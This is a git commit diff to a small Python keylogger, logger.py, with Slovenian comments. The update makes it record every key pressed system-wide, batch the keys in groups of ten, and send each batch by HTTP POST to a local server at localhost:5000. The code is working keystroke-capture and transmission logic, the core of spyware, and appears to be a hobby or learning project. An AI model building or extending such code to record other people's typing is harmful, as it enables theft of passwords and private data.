66d862508c8feb0b7565e9ca6a0342083cd6764d
Amenophis <tonklialjaz@gmail.com>
2026-02-10 10:19:07 +0000

    update

--- logger.py
+++ logger.py
@@ -1,11 +1,17 @@
 import keyboard
+import requests
 
-# Funkcija, ki se sproži ob pritisku tipke
+last10 = []
+
+
 def on_key_press(event):
-    print(f'Pritisnjena tipka: {event.name}')
-
-# Registriramo funkcijo, ki "posluša" tipke
+    if len(last10) == 10:
+        response = requests.post('http://localhost:5000/data', json={'key': last10 })
+        last10.clear()
+    else:
+        print(f'Pritisnjena tipka: {event.name}')
+        last10.append(event.name)
+        print(last10)
+        
 keyboard.on_press(on_key_press)
-
-# Program teče dokler ne pritisnemo ESC
 keyboard.wait('esc')
